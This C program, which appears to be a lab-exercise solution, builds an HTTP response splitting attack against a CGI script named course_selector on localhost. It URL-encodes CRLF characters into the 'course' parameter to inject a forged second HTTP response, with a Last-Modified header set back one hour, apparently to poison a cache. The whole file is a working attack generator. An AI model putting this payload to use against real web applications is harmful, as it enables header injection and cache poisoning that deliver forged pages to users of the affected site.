#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define YOUR_ID "123456789"
#define ONE_HOUR 3600

void generate_last_modified(char *buffer, size_t buffer_size) {
    time_t current_time = time(NULL);
    time_t modified_time = current_time - ONE_HOUR;
    
    struct tm *gmt = gmtime(&modified_time);
    
    strftime(buffer, buffer_size, "%a, %d %b %Y %H:%M:%S GMT", gmt);
}

char* build_attack_payload() {
    char last_modified[128];
    generate_last_modified(last_modified, sizeof(last_modified));
    
    char body[256];
    snprintf(body, sizeof(body), "<HTML>%s</HTML>", YOUR_ID);
    
    int body_length = strlen(body);
    
    char second_response[2048];
    snprintf(second_response, sizeof(second_response),
        "HTTP/1.1 200 OK\r\n"
        "Content-Length: %d\r\n"
        "Last-Modified: %s\r\n"
        "Content-Type: text/html\r\n"
        "\r\n"
        "%s",
        body_length,
        last_modified,
        body
    );
    
    static char payload[4096];
    snprintf(payload, sizeof(payload),
        "%%0d%%0a"
        "Content-Length: 0"
        "%%0d%%0a%%0d%%0a"
        "%s",
        second_response
    );
    
    return payload;
}

char* url_encode(const char *str) {
    static char encoded[8192];
    char *ptr = encoded;
    
    while (*str) {
        if ((*str >= 'A' && *str <= 'Z') ||
            (*str >= 'a' && *str <= 'z') ||
            (*str >= '0' && *str <= '9') ||
            *str == '-' || *str == '_' || *str == '.' || *str == '~') {
            *ptr++ = *str;
        } else if (*str == ' ') {
            *ptr++ = '+';
        } else {
            sprintf(ptr, "%%%02X", (unsigned char)*str);
            ptr += 3;
        }
        str++;
    }
    *ptr = '\0';
    
    return encoded;
}

char* build_full_request() {
    char last_modified[128];
    generate_last_modified(last_modified, sizeof(last_modified));
    
    char body[256];
    snprintf(body, sizeof(body), "<HTML>%s</HTML>", YOUR_ID);
    
    int body_length = strlen(body);
    
    char second_response[2048];
    snprintf(second_response, sizeof(second_response),
        "HTTP/1.1 200 OK\r\n"
        "Content-Length: %d\r\n"
        "Last-Modified: %s\r\n"
        "Content-Type: text/html\r\n"
        "\r\n"
        "%s",
        body_length,
        last_modified,
        body
    );
    
    char injection[4096];
    snprintf(injection, sizeof(injection),
        "\r\n"
        "Content-Length: 0\r\n"
        "\r\n"
        "%s",
        second_response
    );
    
    char *encoded = url_encode(injection);
    
    static char full_request[16384];
    snprintf(full_request, sizeof(full_request),
        "GET /cgi-bin/course_selector?course=%s HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Connection: close\r\n"
        "\r\n",
        encoded
    );
    
    return full_request;
}

int main() {
    printf("=== HTTP Response Splitting Attack Payload ===\n\n");
    
    char last_modified[128];
    generate_last_modified(last_modified, sizeof(last_modified));
    printf("Generated Last-Modified: %s\n\n", last_modified);
    
    char body[256];
    snprintf(body, sizeof(body), "<HTML>%s</HTML>", YOUR_ID);
    printf("Body: %s\n", body);
    printf("Body Length: %zu\n\n", strlen(body));
    
    printf("=== Full Request ===\n");
    printf("%s\n", build_full_request());
    
    return 0;
}
